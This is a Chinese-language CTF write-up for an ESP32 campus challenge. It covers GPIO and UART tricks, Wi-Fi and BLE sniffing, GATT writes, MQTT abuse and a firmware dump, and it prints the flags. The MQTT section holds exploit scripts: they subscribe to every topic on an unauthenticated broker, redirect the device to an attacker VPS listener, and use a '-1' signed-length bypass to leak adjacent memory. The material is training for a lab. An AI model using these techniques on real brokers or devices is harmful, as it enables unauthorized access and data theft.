# ESP32 CTF 清华校赛版本

解题的总体思路是通过对隐去flag的源码分析应该如何获取flag。并且在真实板子上的代码中，采用了动态aes解密真flag的方式，防止选手通过读取固件直接获得所有明文flag。另外在源码中为了清晰阅读，直接采用include c文件分离不同方向题目代码，省掉了头文件。

## 硬件题目

> main/hardware.c

主要考察了对于GPIO、串口通信的理解以及操作，题目开启顺序：

```
task1 -> task2 -> task3
```

### task1

- 题目：将GPIO18抬高，持续3s即可获得flag
- 解法：用杜邦线将GPIO18与3.3v或5v相接


![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174914261.png?raw=true)

```python
[+] hardware task I : hit 1
[+] hardware task I : hit 2
[+] hardware task I : hit 3
[+] hardware task I : THUCTF{Ev3ryth1ng_st4rt_fr0m_GPIO_!!!}
```

### task2

- 题目：在GPIO18处构造出1w个上升沿
- 解法：用杜邦线将GPIO18与板子的TX相接，利用串口一直有数据输出，自动构造上升沿：

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211126153122219.png?raw=true)

```python
[+] hardware task II : trigger 9491
[+] hardware task II : trigger 9971
[+] hardware task II : trigger 10085
[+] hardware task II : THUCTF{AuT0++_is_th3_r1ght_w4y_hhhhhh}
```

### task3

- 题目：在另一个串口寻找第三个flag
- 解法：分析代码，第二个串口的TX、RX分别为4、5号引脚，接到串口转换器，然后用串口工具查看即可（发的串口转换器芯片为CH340，Linux、OSX免驱，WIN10需要手动装驱动）

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211126153232818.png?raw=true)

```
Xshell 7 (Build 0090)
Copyright (c) 2020 NetSarang Computer, Inc. All rights reserved.

Type `help' to learn how to use Xshell prompt.
[C:\~]$ 

Connecting to COM6...
Connected.

THUCTF{UART_15_v3ry_imp0r7ant_1n_i0T}
```

## 网络题目


> main/network.c

主要考察对设备网络通信的使用，分析，捕获，题目开启顺序：

```
        -> task2 
task1 
        -> task3
```

### task1

- 题目：连接板子目标端口，尝试获得flag
- 解法：首先要按照板子要求构造出wifi热点，然后连接板子的3333端口并发送getflag即可

```
[+] network task I: I will connect a wifi -> ssid: fmnlso , password glttosvt 
I (88071) esp_netif_handlers: sta ip: 192.168.43.19, mask: 255.255.255.0, gw: 192.168.43.1
I (88071) wifi connect: got ip:192.168.43.19
I (88071) wifi connect: connected to ap SSID:fmnlso password:glttosvt
I (88081) network: Socket created
I (88081) network: Socket bound, port 3333
I (88091) network: Socket listening
```

```
$ nc 192.168.43.19 3333
getflag
THUCTF{M4k3_A_w1rele55_h0t5p0ts}
```

### task2

- 题目：你知道他发给百度的flag么
- 解法：如果用手机构造热点不方便抓包，故用win或者mac的网络共享开启热点，然后对共享网络的网卡抓包即可

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174710945.png?raw=true)

```
THUCTF{Sn1ffer_N3tw0rk_TrAffic_In_7h4_Main_r0aD}
```

### task3

- 题目：flag在空中
- 解法：使用kali以及外置网卡抓802.11裸包，即可看到有flag的报文


![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174659640.png?raw=true)

```
➜  airmon-ng start wlan0 
➜  airodump-ng wlan0mon
```

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174624863.png?raw=true)


如果是Mac电脑，则不需要外置网卡，可直接使用自带网卡抓包，首先确定目标wifi的信道：

```
➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s

            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
        Huawei@123 7c:b5:9b:53:be:a8 -50  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
            hegysa 12:c0:c9:62:70:de -33  1       Y  CN WPA2(PSK/AES/AES) 
```

然后抓取目标信道：

```
➜  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 1 
Capturing 802.11 frames on en0.
```

开启wireshark并将无线网卡设置成监控模式，然后即可抓取802.11的裸包：



![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/macwifi.png?raw=true)


```
THUCTF{Y0u_cAn_s3nd_4nd_sNiff3r_802.11_r4w_pAckag3}
```


## 蓝牙题目

> main/bluetooth.c

主要考察对经典蓝牙，低功耗蓝牙的基本操作以及分析，题目开启顺序：

```
task1 -> task2 -> task3
```

### task1

- 题目：修改蓝牙名称并设置可被发现即可获得flag
- 解法：如题

```
[+] bluetooth task I : Please change your bluetooth device name to uunpyagw

I (43491) GAP: [+] bluetooth task I : Device found: a8:e5:44:3d:db:2e
I (43511) GAP: [+] bluetooth task I : Found a target device, address a8:e5:44:3d:db:2e, name uunpyagw

bluetooth task I : THUCTF{b1u3t00th_n4me_a1s0_c4n_b3_An_aTT4ck_surfAce}
```

### task2

- 题目：flag在空中
- 解法：通过第一关后，板子会由经典蓝牙切换到低功耗蓝牙，flag就在BLE的广播报文中，使用手机软件[nRF connect](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=en&gl=US)即可获得：


```
[+] bluetooth task II : BLE device name is jlprw
[+] bluetooth task II : Please find the second flag in the ADV package from this BLE device jlprw
```

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174752464.png?raw=true)

```
Python 3.8.7 (tags/v3.8.7:6503f05, Dec 21 2020, 17:59:51) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> bytes.fromhex('06096A6C70727710FD5448554354467B416456443437617D') 
b'\x06\tjlprw\x10\xfdTHUCTF{AdVD47a}
```

```

$ sudo blescan
Scanning for devices...
    Device (new): 94:3c:c6:cd:da:86 (public), -47 dBm 
	Complete Local Name: 'jsstg'
	0xfd: <5448554354467b416456443437617d>

$ sudo bluescan -m le
[WARNING] Before doing an active scan, make sure you spoof your BD_ADDR.
[INFO] LE active scanning on hci0 with timeout 10 sec


----------------LE Devices Scan Result----------------
Addr:        94:3C:C6:CD:DA:86 (Espressif Inc.)
Addr type:   public
Connectable: True
RSSI:        -45 dBm
General Access Profile:
    Complete Local Name: jsstg
    0xFD (Unknown): 5448554354467b416456443437617d



$ python3
Python 3.9.5 (default, May 11 2021, 08:20:37) 
[GCC 10.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> bytes.fromhex('5448554354467b416456443437617d')
b'THUCTF{AdVD47a}'
```

### task3


- 题目：分析GATT业务并获得flag
- 解法：连接此BLE，并对id为0xff的service写入task2的flag，再次读取即可获得flag

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127174742131.png?raw=true)


```python
import pygatt

adapter = pygatt.GATTToolBackend()
adapter.start()
device = adapter.connect('94:3C:C6:CD:DA:86')
print("success")
for uuid in device.discover_characteristics().keys():
    print("Read UUID %s" % (uuid))
```

```python
$ python3 exp.py 
success
Read UUID 00002a05-0000-1000-8000-00805f9b34fb
Read UUID 00002a00-0000-1000-8000-00805f9b34fb
Read UUID 00002a01-0000-1000-8000-00805f9b34fb
Read UUID 00002aa6-0000-1000-8000-00805f9b34fb
Read UUID 0000ff01-0000-1000-8000-00805f9b34fb
```

```python
import pygatt

adapter = pygatt.GATTToolBackend()
adapter.start()
device = adapter.connect('94:3C:C6:CD:DA:86')
print("success")
uuid = '0000ff01-0000-1000-8000-00805f9b34fb'

print(device.char_read(uuid))

device.char_write(uuid,b'THUCTF{AdVD47a}')
print(device.char_read(uuid))
```

```python
$ python3 exp.py 
success
bytearray(b'\xde\xed\xbe\xef')
bytearray(b'THUCTF{WrItE_4_gA7T')
```

## MQTT

> main/mqtt.c

主要考察对MQTT协议存在的未授权未认证的弱点，以及空中跳跃的攻击模型，推荐阅读：

- [物联网设备消息总线机制的使用及安全问题](https://gtrboy.github.io/posts/bus/)

题目开启顺序：

```
task1 
task2 -> task3
```

拔掉跳冒以切换方向，可以看到日志：

```
[+] now task : MQTT
```

阅读源码可以看到MQTT连接了一个域名（花了一块钱买了一年）：

```c
mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
```

这个域名对应的服务器上启了一个为未授权未认证的MQTT broker，也就是本项目中的那个[docker](https://github.com/xuanxuanblingbling/esp32ctf_thu/blob/main/docker/Dockerfile)，对于MQTT的收发包，推荐工具：[MQTT.fx](https://mqttfx.jensd.de/index.php/download)


### task1 

- 题目：分析GATT业务并获得flag
- 解法：可以直接连接broker，井号为通配符，直接订阅所有主题，即可获得flag

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175028179.png?raw=true)

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175038978.png?raw=true)


另外也可以使用python来订阅MQTT服务，依赖安装：

```python
➜  python3 -m pip install paho-mqtt
```

```python
import paho.mqtt.client as mqtt

def on_message(client, userdata, msg):
    print(msg.topic+" , "+str(msg.payload))

client = mqtt.Client()
client.connect("mqtt.esp32ctf.xyz",1883,60)
client.on_message = on_message
client.subscribe("#")
client.loop_forever()
```

```
➜  python3 exp.py
/topic/flag1 , b'THUCTF{#_1s_God_in_MQTT}'
/topic/flag2/tdzloj , b'www.baidu.com?46'
```


### task2 

- 题目：分析GATT业务并获得flag
- 解法：向flag2目标主题发送自己VPS的IP即可

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175056665.png?raw=true)

当然也可以使用python向目标topic发送消息：

```python
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("mqtt.esp32ctf.xyz",1883,60)
client.publish("/topic/flag2/tdzloj","49.233.20.19")
```

即可在VPS上收到flag：

```python
ubuntu@VM-16-6-ubuntu:~$ sudo nc -l -p 80
GET / HTTP/1.0
User-Agent: esp-idf/1.0 esp32
flag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel} 
```

### task3

- 题目：分析GATT业务并获得flag
- 解法：判断长度时有符号，比较时相当于无符号，故长度为-1即可绕过大小限制，带出位于flag2后的flag3

![image](https://github.com/xuanxuanblingbling/esp32ctf_thu/raw/main/wp/pic/image-20211127175117275.png?raw=true)


当然也可以直接在VPS上一个脚本搞定：

```python
import paho.mqtt.client as mqtt
from pwn import *

io = listen(80)

client = mqtt.Client()
client.connect("mqtt.esp32ctf.xyz",1883,60)
client.publish("/topic/flag2/tdzloj","49.233.20.19?-1")

print(io.recv())                 
```

结果如下：

```python
ubuntu@VM-16-6-ubuntu:~$ sudo python3 exp.py 
[+] Trying to bind to :: on port 80: Done
[+] Waiting for connections on :::80: Got connection from ::ffff:61.148.244.254 on port 64616
b'GET / HTTP/1.0\r\nUser-Agent: esp-idf/1.0 esp32\r\nflag: THUCTF{attAck_t0_th3_dev1ce_tcp_r3cV_ch4nnel} 
[+] MQTT task III: THUCTF{0ver_the_Air_y0u_c4n_a77ack_t0_1ntranet_d3v1ce}\r\n\r\n'
[*] Closed connection to ::ffff:61.148.244.254 port 64616
```

## 固件彩蛋

使用esptools.py dump固件：

```python
➜   python ~/Desktop/esp/esp-idf2/components/esptool_py/esptool/esptool.py \
    --baud 115200 --port /dev/tty.usbserial-14420 read_flash 0x10000 0x310000 dump.bin
```

windows上的IDF离线环境安装后，自动设置的环境变量中，也是可以直接用esptools.py的：

```python
> esptool.py --baud 115200  read_flash 0x10000 0x310000 dump.bin
```

然后strings即可找出flag：

```python
$ sudo apt install binutils
$ strings ./dump.bin  | grep "THUCTF{"
THUCTF{DuMp_the_b1n_by_espt00l.py_Ju5t_1n_0ne_Lin3}
```